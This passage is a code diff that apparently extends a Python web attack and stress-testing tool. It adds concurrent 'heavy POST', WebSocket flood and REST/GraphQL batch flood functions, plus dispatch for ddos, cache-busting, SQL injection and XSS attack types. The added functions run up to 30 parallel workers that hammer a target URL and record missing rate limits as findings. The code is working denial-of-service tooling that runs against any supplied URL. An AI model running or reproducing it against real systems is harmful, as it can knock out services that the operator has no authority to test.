+                                "current_attack": "Heavy POST Stress",
+                                "attack_id": attack_id
+                            }
+                        }))
+
+                        if not finding_logged and seq >= 3 and resp.status not in (413, 429):
+                            finding_logged = True
+                            await _broadcast_finding({
+                                "type": "Unrestricted POST Body Parser / Missing HTTP 413/429 Limit",
+                                "severity": "Medium",
+                                "url": ep,
+                                "payload": f"Concurrent Nested JSON POST ({len(json.dumps(nested_json))} bytes/req)",
+                                "detail": "Endpoint continuously parsed high-concurrency nested JSON bodies without enforcing HTTP 413 Payload Too Large or HTTP 429 rate limiting.",
+                                "evidence": f"HTTP {resp.status} | Body size: {len(json.dumps(nested_json))} B | Parse RTT: {req_time*1000:.1f} ms",
+                                "timestamp": datetime.now().isoformat(),
+                                "attack_id": attack_id
+                            })
+                except Exception:
+                    await record_request_metric(False)
+
+                sleep_delay = 1.0 / max(intensity, 1)
+                await asyncio.sleep(sleep_delay + random.uniform(0.0, 0.01))
+
+        tasks = [asyncio.create_task(worker(i)) for i in range(min(max(threads, 1), 30))]
+        await asyncio.gather(*tasks)
+
+
+async def ws_stress_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
+    """High-Concurrency WebSocket Handshake & Rapid Frame Stress Benchmark."""
+    base = format_url(url).rstrip('/')
+    ws_base = re.sub(r'^http', 'ws', base)
+    ws_candidates = [f"{ws_base}/ws", f"{ws_base}/?ws=true"]
+    start_time = time.time()
+    ws_finding_logged = False
+    upgrade_finding_logged = False
+
+    connector = aiohttp.TCPConnector(ssl=False, limit=100)
+    async with aiohttp.ClientSession(connector=connector) as session:
+        async def worker(w_id: int):
+            nonlocal ws_finding_logged, upgrade_finding_logged
+            seq = 0
+            while time.time() - start_time < duration and metrics["attacks_running"]:
+                seq += 1
+                ws_target = ws_candidates[seq % len(ws_candidates)]
+                t0 = time.time()
+                connected_ws = False
+                try:
+                    async with session.ws_connect(ws_target, timeout=aiohttp.ClientTimeout(total=3.0)) as ws_conn:
+                        connected_ws = True
+                        for frame_idx in range(4):
+                            if time.time() - start_time >= duration or not metrics["attacks_running"]:
+                                break
+                            f_start = time.time()
+                            await ws_conn.send_str(json.dumps({"type": "ping", "worker": w_id, "seq": frame_idx}))
+                            req_time = time.time() - f_start
+                            await record_request_metric(True, req_time, 101)
+                            await manager.broadcast(json.dumps({
+                                "type": "metrics",
+                                "data": {
+                                    "total_requests": metrics["total_requests"],
+                                    "successful_requests": metrics["successful_requests"],
+                                    "failed_requests": metrics["failed_requests"],
+                                    "response_time": req_time,
+                                    "current_attack": "WebSocket Stress",
+                                    "attack_id": attack_id
+                                }
+                            }))
+                            if not ws_finding_logged:
+                                ws_finding_logged = True
+                                await _broadcast_finding({
+                                    "type": "Unthrottled WebSocket Frame & Session Concurrency",
+                                    "severity": "Medium",
+                                    "url": ws_target,
+                                    "payload": "Concurrent WebSocket Upgrade + Rapid Frame Stream",
+                                    "detail": "WebSocket endpoint accepted concurrent persistent connections and rapid frame bursts without per-IP connection caps or frame throttling.",
+                                    "evidence": f"HTTP 101 Switching Protocols on {ws_target} | Frame RTT: {req_time*1000:.2f} ms",
+                                    "timestamp": datetime.now().isoformat(),
+                                    "attack_id": attack_id
+                                })
+                            await asyncio.sleep(0.15 / max(intensity, 1))
+                except Exception:
+                    pass
+
+                if not connected_ws:
+                    # Fallback: HTTP Upgrade handshake stress against base URL
+                    t_up = time.time()
+                    try:
+                        async with session.get(
+                            f"{base}/?ws=true",
+                            headers={
+                                "Connection": "Upgrade",
+                                "Upgrade": "websocket",
+                                "Sec-WebSocket-Version": "13",
+                                "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ=="
+                            },
+                            timeout=aiohttp.ClientTimeout(total=3.0)
+                        ) as resp:
+                            await resp.read()
+                            req_time = time.time() - t_up
+                            await record_request_metric(resp.status < 500, req_time, resp.status)
+                            await manager.broadcast(json.dumps({
+                                "type": "metrics",
+                                "data": {
+                                    "total_requests": metrics["total_requests"],
+                                    "successful_requests": metrics["successful_requests"],
+                                    "failed_requests": metrics["failed_requests"],
+                                    "response_time": req_time,
+                                    "current_attack": "WebSocket Stress",
+                                    "attack_id": attack_id
+                                }
+                            }))
+                            if not upgrade_finding_logged and seq >= 3 and resp.status < 500:
+                                upgrade_finding_logged = True
+                                await _broadcast_finding({
+                                    "type": "Unthrottled WebSocket Upgrade Handshake Processing",
+                                    "severity": "Low",
+                                    "url": f"{base}/?ws=true",
+                                    "payload": "GET /?ws=true (Connection: Upgrade, Upgrade: websocket)",
+                                    "detail": "Server processed rapid concurrent WebSocket Upgrade handshake requests without rate-limiting.",
+                                    "evidence": f"HTTP {resp.status} | Handshake RTT: {req_time*1000:.1f} ms",
+                                    "timestamp": datetime.now().isoformat(),
+                                    "attack_id": attack_id
+                                })
+                    except Exception:
+                        await record_request_metric(False)
+
+                await asyncio.sleep(1.0 / max(intensity, 1))
+
+        tasks = [asyncio.create_task(worker(i)) for i in range(min(max(threads, 1), 30))]
+        await asyncio.gather(*tasks)
+
+
+async def api_stress_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
+    """High-Concurrency Multi-Endpoint REST & GraphQL Batch Pool Stress Benchmark."""
+    base = format_url(url).rstrip('/')
+    batch_gql = [
+        {"query": "query B1 { __typename __schema { queryType { name } } }"},
+        {"query": "query B2 { __typename }"},
+        {"query": "query B3 { __typename }"},
+        {"query": "query B4 { __typename }"},
+        {"query": "query B5 { __typename }"}
+    ]
+    rest_targets = [
+        ("GET", f"{base}/api/products?id=1", None),
+        ("GET", f"{base}/api/users/1", None),
+        ("POST", f"{base}/graphql", batch_gql),
+        ("GET", f"{base}/api/auth/verify", None),
+    ]
+    start_time = time.time()
+    pool_finding_logged = False
+    timeout_cfg = aiohttp.ClientTimeout(total=3.5, sock_connect=1.5, sock_read=2.5)
+    connector = aiohttp.TCPConnector(ssl=False, limit=100)
+
+    async with aiohttp.ClientSession(connector=connector, timeout=timeout_cfg) as session:
+        async def worker(w_id: int):
+            nonlocal pool_finding_logged
+            seq = 0
+            while time.time() - start_time < duration and metrics["attacks_running"]:
+                method, ep, body_json = rest_targets[(w_id + seq) % len(rest_targets)]
+                seq += 1
+                t0 = time.time()
+                try:
+                    async with session.request(method, ep, json=body_json) as resp:
+                        await resp.read()
+                        req_time = time.time() - t0
+                        await record_request_metric(resp.status < 500, req_time, resp.status)
+
+                        await manager.broadcast(json.dumps({
+                            "type": "metrics",
+                            "data": {
+                                "total_requests": metrics["total_requests"],
+                                "successful_requests": metrics["successful_requests"],
+                                "failed_requests": metrics["failed_requests"],
+                                "response_time": req_time,
+                                "current_attack": "API Pool Stress",
+                                "attack_id": attack_id
+                            }
+                        }))
+
+                        if not pool_finding_logged and seq >= 4 and resp.status == 200:
+                            pool_finding_logged = True
+                            await _broadcast_finding({
+                                "type": "Unthrottled Multi-Endpoint API & GraphQL Batch Load",
+                                "severity": "Medium",
+                                "url": ep,
+                                "payload": f"Concurrent {method} API/GraphQL Batch Pool Stress",
+                                "detail": "API endpoints processed concurrent multi-worker REST and batched GraphQL requests without enforcing token-bucket rate limits (HTTP 429).",
+                                "evidence": f"HTTP {resp.status} on {ep} | RTT: {req_time*1000:.1f} ms",
+                                "timestamp": datetime.now().isoformat(),
+                                "attack_id": attack_id
+                            })
+                except Exception:
+                    await record_request_metric(False)
+
+                sleep_delay = 1.0 / max(intensity, 1)
+                await asyncio.sleep(sleep_delay + random.uniform(0.0, 0.01))
+
+        tasks = [asyncio.create_task(worker(i)) for i in range(min(max(threads, 1), 30))]
+        await asyncio.gather(*tasks)
 
 
 async def run_attack_coordinator(req: AttackRequest, attack_id: str):
@@ -1944,6 +2270,14 @@ async def run_attack_coordinator(req: AttackRequest, attack_id: str):
     try:
         if req.attack_type == "ddos":
             await ddos_attack(req.url, req.duration, req.intensity, req.threads, attack_id)
+        elif req.attack_type == "cache_bust":
+            await cache_bust_attack(req.url, req.duration, req.intensity, req.threads, attack_id)
+        elif req.attack_type == "heavy_post":
+            await heavy_post_attack(req.url, req.duration, req.intensity, req.threads, attack_id)
+        elif req.attack_type == "ws_flood":
+            await ws_stress_attack(req.url, req.duration, req.intensity, req.threads, attack_id)
+        elif req.attack_type == "api_flood":
+            await api_stress_attack(req.url, req.duration, req.intensity, req.threads, attack_id)
         elif req.attack_type == "sql":
             await sql_injection_attack(req.url, req.duration, req.intensity, req.threads, attack_id)
         elif req.attack_type == "xss":
